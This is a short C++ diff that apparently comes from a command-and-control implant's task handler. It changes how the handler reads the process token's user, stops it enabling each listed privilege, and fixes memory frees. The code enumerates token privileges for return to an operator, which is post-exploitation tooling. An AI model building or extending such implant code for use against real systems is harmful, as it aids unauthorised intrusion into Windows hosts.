@@ -1088,7 +1088,7 @@ auto DECLFN Task::Token(
             CHAR*  ThreadUser  = nullptr;
             HANDLE TokenHandle = nullptr;
 
-            TokenHandle = Self->Tkn->CurrentThread();
+            TokenHandle = Self->Tkn->CurrentPs();
             ThreadUser  = Self->Tkn->GetUser( TokenHandle );
             
             if ( ThreadUser ) {
@@ -1175,19 +1175,21 @@ auto DECLFN Task::Token(
             break;
         }
         case Enm::Token::ListPriv: {
-            ULONG  PrivListLen = 0;
-            PVOID  PrivList    = nullptr;
-            HANDLE TokenHandle = Self->Tkn->CurrentPs();
+            ULONG       PrivListLen = 0;
+            PRIV_LIST** PrivList    = nullptr;
+            HANDLE      TokenHandle = Self->Tkn->CurrentPs();
 
-            PrivList = Self->Tkn->ListPrivs( TokenHandle, PrivListLen );
+            PrivList = (PRIV_LIST**)Self->Tkn->ListPrivs( TokenHandle, PrivListLen );
 
             Self->Pkg->Int32( Package, PrivListLen );
 
             for ( INT i = 0; i < PrivListLen; i++ ) {
-                Self->Tkn->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                 Self->Pkg->Str( Package, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                 Self->Pkg->Int32( Package, static_cast<PRIV_LIST**>(PrivList)[i]->Attributes );
-                hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+                if ( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName ) 
+                    hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+
+                hFree( PrivList[i] );
             }
 
             Self->Ntdll.NtClose( TokenHandle );
